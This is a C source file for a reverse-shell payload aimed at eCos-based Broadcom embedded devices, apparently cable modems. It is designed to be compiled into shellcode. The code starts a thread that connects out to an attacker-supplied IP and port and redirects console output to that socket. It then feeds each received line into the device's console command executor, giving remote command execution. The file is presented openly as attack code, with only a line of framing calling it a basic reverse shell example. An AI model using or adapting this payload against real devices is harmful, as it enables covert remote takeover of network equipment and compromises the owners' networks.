#include "external.h"
#include "payload.h"
/**
 * This is the most basic reverse shell example I could come up with.
 * 
 */
#define PAYLOAD_PRIORITY     23
#define PAYLOAD_STACKSIZE  0x2000
#define COMMAND_OFFSET  0x1080

int __start(unsigned long ip_address, unsigned short port)
{
    // create remote host sockaddr structure with received IP and port as command line
    // parameters
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = port; 
    host.sin_addr.s_addr = ip_address;
    // NOTE: there is an open question regarding the dynamic allocation
    // of a thread object and corresponding stack on the heap.
    //
    // Usually, these are defined statically with 'static' keyword and allocation
    // is somewhere fixed.
    //
    // However, if we do that we cannot generate a proper shellcode due to bss size 
    // restrictions so we use the heap, which may or may not reposess that memory.
    // So far it worked pretty well.
    int payload_handle;
    // allocate thread stack memory
    char* payload_stack = malloc(PAYLOAD_STACKSIZE * sizeof(char));
    // allocate thread object
    //cyg_thread* payload_thread = malloc(sizeof(payload_thread));
    static cyg_thread payload_thread;
    // create thread
    cyg_thread_create(
        PAYLOAD_PRIORITY,
        &payload,
        //host,
        &host,
        "payload",
        payload_stack,
        PAYLOAD_STACKSIZE,
        &payload_handle,
        &payload_thread
    );
    // launch thread
    cyg_thread_resume(payload_handle);
    // this sleep call is required otherwise the host struct
    // is reclaimed, and the structure is messed up when
    // our thread calls connect().
    sleep(5);
    host.sin_port = port; 
    return 0;
}

int payload(struct sockaddr_in* host){

    int sockfd;
    int recvd;

    char addrbuf[16];
    inet_ntop4(&host->sin_addr, addrbuf, sizeof(addrbuf));
    printf("[+] Launching reverse shell to %s:%d\n", addrbuf, host->sin_port);
    
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("[!] socket error - %s\n", strerror(errno));
        return -1;
    }

    // without sleep, the sockfd does not work for some reason
    sleep(2);

    if (connect(sockfd, host, 0x2020) < 0) {
        printf("[!] connect error - %s\n", strerror(errno));
        return -1;
    }

    char *buffer = malloc(0x100);
    if(buffer == NULL){
        printf("[!] Error when allocating buffer.\n");
        return -1;
    }

    void *console_instance = BcmConsoleGetSingletonInstance();
    int *fp = (int*)cyg_fp_get(sockfd);
    cyg_fd_assign(0x1, fp);
    cyg_fp_free(fp);

    while (1)	
    {
        bzero(buffer, 0x100);
        recvd = recv(sockfd, buffer, 0x100, 0x0);
        
        if (recvd > 0) {
            char *command_buffer = ((char *)console_instance);
            command_buffer += COMMAND_OFFSET;
            strcpy(command_buffer, buffer);
            if(strncmp("exit", buffer, 4) == 0) {
               break;
            }
            command_buffer[recvd+1] = 0x0;
            BcmConsoleExecuteCurrentCommand(console_instance);
        }
        else{
            // -1 is error; 0 is disconnected
            break;
        }
    }
    //free up shit
    free(buffer);
    printf("[+] Quitting. Reassigning console.\n");
    fp = (int*)cyg_fp_get(2);
    cyg_fd_assign(0x01, fp);
    cyg_fp_free(fp);
    close(sockfd);
    
    //exiting the thread deallocate everything related
    //to the thread but the OS keeps metadata about it
    //so it will still be visible when calling 'taskShow',
    //with status set to 'EXIT'
    cyg_thread_exit();
    return 0;
}
